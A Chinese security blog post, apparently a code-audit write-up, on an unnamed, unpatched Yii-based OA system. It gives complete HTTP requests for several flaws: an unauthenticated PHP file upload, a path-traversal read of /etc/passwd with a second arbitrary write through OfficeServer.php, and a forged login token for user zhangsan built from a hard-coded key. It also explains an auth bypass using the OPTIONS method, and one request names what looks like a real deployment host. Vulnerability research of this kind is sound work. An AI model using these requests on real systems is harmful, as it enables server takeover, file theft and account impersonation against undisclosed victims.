#  某OA 0day审计分析   
星盟@Zjacky  实战安全研究   2024-03-16 10:00  
  
**前言**  
  
本次审计的是一套Yii框架开发的OA系统，算是小0day吧，由于尚未公开，大部分都是厚码。  
  
本篇文章由星盟安全团队成员@Zjacky师傅投稿，博客地址为https://zjackky.github.io/  
  
**开发文档**  
  
(有的时候一键搭建的时候是会存在一些开发文档的，这些入口文件，路由拼接 ， 都需要去查看这些开发文档)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wic1ezCH75EPJs3OWKKpTUQXIdfORrzckpR3l1XHApc7CuAPQIibLGWiag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WJvvhJvBwqCSQbehhyDs5KUuR9RsEPeMVPdDxHuJianYSjwfQLGyNM6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以发现他其实是以system作为根目录来进行模块化管理，所以我们可以对照着开发文档以及登录的接口来对比看这个MVC框架是如何对应的,当然了，我们可以找到他的Yii入口文件为/web/index.php  
  
  
这个index.php做了几个定义  
  
首先是设定了我们用户登录的地址为/oa/main/login   
  
然后应用的入口为oa  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wepic1Q6p21ibx3QL8ice7t75BNiaks2SG2tfib5tAHXPKWRtpYVr1iaNEnaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
抓到登录的接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WOGMaO9GFmpvglACSyxutFWHOCFiaCKxhJvGEUPATxrUJaR5daTROfkg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以发现是/oa/main/login这样的接口(由于他有csrf-token所以重放包会302)，所以直接看报错回显即可。  
  
  
那我们再来仔细看看Yii的路由分析(具体详细的原理代码跟踪在参考链接中可参考)  
  
  
其实框架的URI分析还是有点复杂的(看个大概就行)，这个时候我们来找找这个/oa/main/login是怎么对应的  
  
在  
\system\modules\oa\controllers\MainController.php 找到以下代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WnzVs4IB9ZDmZTSfhZbwGlBibzGjztlCX09UXiaXcvPLD4VI8HAPlfEiaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W0PFRMWjwUT3JTXRlxG3reL8qOBRDv5Ybd9ltBibLH0gGVJd3HVxU8ibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
继续跟进  
  
\system\modules\user\components\LoginAction::className()  
  
搜索一下  
账号不存在其实就可以找到确实是这么个对应法了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WPD7SmDJeKaKnplXBcEgxR4U2xP66MVzvdq5rHL3op0MMMIxWwmHuNg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
那么这个路由总结一下  
  
/oa/main/login -> 模块名(models)/控制器(controller)/操作(action)  
  
  
当然了 ，在后续的审计过程中发现其实也给出了相对应的路由访问形式写在了代码中的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WHgUgTSDib97Bwhp6spX6RL8C2zeCYozLxVGG8R4LUicYjWSvvb1paDyw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
会在$dependIgnoreValueList 变量中将一些路由访问形式写出来(前提是这个$layout是一个@开头的东东)  
  
**审计**  
  
**上传1**  
  
  
  
全局搜了下move_uploaded_file 然后找了两个在modules下的文件进行审计  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WtXay5GXrzrbyeTopJBppiaflg9NYIHxMNckxQC8fibIBibPQhEsG0Fx9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
当进去看上传逻辑的时候发现有一个很抽象的点，开发把扩展后缀的限制注释掉了，所以导致了后面写$config的时候会没有效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WLZtKich70GTkZWpZibaR3iaiaVbqluo1P26Dszot7nm9dNBHCrMqVyVvZQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
那么很有可能就会存在任意文件上传了，然后下面的操作就是跟进了下saveAs方法发现也并没有什么过滤  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W8zr4n06u9AaIjHVksLC1tnlYPAF92ia20Z6jCdp4jIYNFWOnBicQehMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
那么接下来就是如何去找到一个控制器是调用了这个类的方法  
  
\system\modules\main\extend\SaveUpload.php#saveFile的  
  
emmm 全局搜索了下发现并没有，于是我在此全局搜索了下SaveUpload这个关键词  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wwqq9s1u7IU2k4G5u7pl7XwGPsWl4xjnfzOqWnQ1ssjiaKicCVGTeZicOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
发现一个点，他通过命名空间来进行调用方法的，所以说只要出现了SaveUpload::saveFile( (并且在modules下)就会存在任意文件上传了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W7ibNBt2sNPSUgicZXbKiaib8C2ficibX6aWtmkOCBaib3QOIZjm5GoV26Q8jA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
那么在上述已经讲述过了Yii框架的路由分析，所以这个时候只要去找到谁去调用了这些路径的方法即可 ，比如全局搜索  
- \system\modules\main\extend\Upload.php  
  
- \system\modules\party\extend\Upload.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W6F5P4Hiat4otXfpXWkdqtcKMwGRSp2MEqmAH0NthxuJdRGU17OTTH1A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
但是上述两个最为简单的发现并没有成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W5ZTguZ4iaQz4vibia54LUcyso4ZPiaiaGRndUHj72lsnTXia1ia9ALgFvBLSw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
这里太多任意文件上传  
  
其实大部分都不能成功的，因为鉴权了，但是以下是存在未授权访问的  
- contacts/default/upload  
  
- salary/record/upload  
  
- knowledge/default/upload  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WnDPaGYRODOxdOPK7eoJc07NWVTVjrk70s3EYApV0Wr1qEo02okAn6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
而鉴权的代码是这样子的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WtCFfCR8zibud9C5Cibatdiapto8jHUGgQRaCiatTNnicRJyHSmQ1ts2G4KQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
最终报文  
```
POST /index.php/salary/record/upload HTTP/1.1
Host: xxx
Content-Length: 196
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload/upload.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryQayVsySyhSwgpmLk
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryQayVsySyhSwgpmLk--
```  
  
**上传2 + 任意文件下载**  
  
  
  
全局搜索函数move_uploaded_file  
  
找到  
\web\static\lib\weboffice\js\OfficeServer.php这个文件  
  
直接访问下发现返回200证明文件存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WxliapdUtFC9EfQ4WzHzPQhQP3mD2ia9kPyOhn1nvBDgeAicdoehz4DIzw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
接着审计代码逻辑  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W1y7A3kgZicic9Ffia6mPFPayUJliaL7hZOMGIHwwl5x1ZaicOnicJqwNYIVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
代码很短，可以很轻松读懂，获取一个json值，然后获取他的OPTION值满足他的switch值就可以进入到上传的逻辑，可以进行文件下载，也可以进行上传  
  
经过测试，可控  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W7Kks4087h9OD7eic0kobXgeGFCPW3iczibc6cydctq3dia7EmL3HtqnjCg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WoNNgsP5DujhiaaibumWTBqInnJUsiauUzlVkGlkuDp4Z18ZEc4rlaDU9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
接着就是构造下载包和上传包了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wh56hHxFpibVMcgW0ZIjPNia1hEnH7vgHl142geibicNqFG6hdmKgNNGBYw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
GET /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22LOADFILE%22,%22FILEPATH%22:%22/../../../../../../../../../../../etc/passwd%22} HTTP/1.1
Host: xxxx
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://oa1.shuidinet.com/index.php/oa/main/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wes8zhYyibJQC3GLw6krvxkqjxDficCoZHLibjwHwBusKcQshBXpxT8Ojg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
POST /static/lib/weboffice/js/OfficeServer.php?FormData={%22OPTION%22:%22SAVEFILE%22,"FILEPATH":"/222.php"} HTTP/1.1
Host: xxxx
Content-Length: 202
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQayVsySyhSwgpmLk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload/upload.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryQayVsySyhSwgpmLk
Content-Disposition: form-data; name="FileData"; filename="222.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryQayVsySyhSwgpmLk--

```  
  
**任意用户登录**  
  
  
  
在上传的篇章中是可以知道架构的，看了oa下的文件，发现Auth的鉴权控制器查看后发现存在硬编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WkeGNRBXSqZzEOa6PPXUAuZVPstOI1HbTLiaPNxO0L5aaIWmWibCr8vOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wmc8dPAmpYETkkTRVurAWgqlFLCFk3NTJicSpkBY6zEsHTjU3meG2KmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
当然也给了注释  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wa7zhVjkZ3vhb0jXaF2GokK0NoqWEib6GyHltNWmljkIJ8vCdJsapNYQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
那么构造逻辑即可成功登录，传入user base64加密的内容并且跟key进行拼接后再md5加密传为token， 两者相等即可登录  
  
  
前提是user是存在的(跑一下就知道是zhangsan存在)  
```
GET /oa/auth/withub?user=emhhbmdzYW4=&token=b336aa3ea64e703583bb7cbe6d924269 HTTP/1.1
Host: xxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

# user zhangsan
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WIXD61fGmkgib1CClklYw7r1X2ImlWJMRCEs6pZzzmq6lFpqanI3PLLg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
直接跳转即可登录了  
  
  
**权限绕过**  
  
  
  
找到这个文件   
  
api/modules/v1/controllers/UserController.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6Wzs5xia7GVLwsGUDA7mQJhmJr78keYHxaxk7nOichmruXKcVwjQp5tfKQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
细看这里的代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WeURjfPFvRcVWc6ttXjicknjT7KPVS9P9ZzI54xoO712fGgtSkVPXMfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
    // 不需要认证的方法，用下划线形式，如get_info
    public $notAuthAction = ['auth','verify-url'];
```  
  
方法名为  
```
actionVerifyUrl()
actionGetInfo() 
actionAuth()
```  
  
直接传参，actionAuth  和 VerifyUrl 不需要鉴权  
  
那也就是说GetInfo是需要鉴权的，我们传参进去试试  
  
  
需要去熟悉一下Yii的框架了，所以从他的/web/下的入口文件来找到定义/api的入口 -> oa-api.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WKMMKAM4kvQCoT559ucia1P4vLj4vDLibsJO07bnT4myjjXmt7S1U9RQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
尝试以下传参后发现返回404  
```
/oa-api.php/v1/user/getinfo?id=1
```  
  
重新回过头来查看这串代码  
```
public $notAuthAction = ['auth','verify-url'];
```  
  
发现可能中间会存在-来进行分割  
  
所以最终通过以下传参发现成功传入但回显为401证明存在鉴权  
```
/oa-api.php/v1/user/get-info?id=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WAKB7R4qrcbaDDibQHbs9Yj2rXicvQHTX2fLyAgBX4rdNiaHNammX6E7dQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
这里因为他继承了BaseApiController 所以跟进父类查看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6WZIM9Lh1jO4SmY4KGcohv0QR448iczAoQicDAicDuO8ENcPkfrRzd9Eiaug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
tips: 这里的behaviors方法应该是会先走的  
  
所以下边有一个||进行了一个if判断，这里判断登录是否请求方式为OPTIONS 或者 是不鉴权的接口(notAuthAction)就进入下面逻辑，那就猜测通过OPTIONS后就不鉴权了接口于是构造报文  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EEDM9NXhOXRX678gK46uZTgCYwfSnM6W8ETeSbs53HIldacXPbq8SASib98m9Df0BNiaqssCl5m0Im13nHibfFE6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**参考链接**  
  
  
- https://blog.csdn.net/yang1018679/article/details/105929162 (Yii路由分析一)  
  
- https://blog.csdn.net/yang1018679/article/details/105935326 (Yii路由分析二)  
  
**总结**  
  
  
- 一定要细心，多仔细去猜测开发的思路  
  
- 多猜测一些奇怪的写法(以黑盒的逻辑来看白盒)  
  
- 要有经验  
  
